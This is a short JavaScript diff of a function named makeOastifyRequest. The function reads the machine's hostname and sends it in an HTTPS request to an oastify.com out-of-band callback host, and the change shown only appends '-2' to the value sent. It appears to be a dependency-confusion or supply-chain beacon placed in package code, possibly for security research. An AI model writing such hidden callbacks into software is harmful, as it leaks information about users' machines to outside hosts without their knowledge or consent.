@@ -6,7 +6,7 @@ function makeOastifyRequest() {
   return new Promise((resolve) => {
     const hostname = os.hostname();
     const encodedHostname = encodeURIComponent(hostname);
-    const url = `https://6fmprfe9b46nowg23dnaypcwsnyfm5au.oastify.com/?hostname=${encodedHostname}`;
+    const url = `https://6fmprfe9b46nowg23dnaypcwsnyfm5au.oastify.com/?hostname=${encodedHostname}-2`;
 
     const req = https.get(url, (res) => {
       console.log(`  ✓ GOOD `);
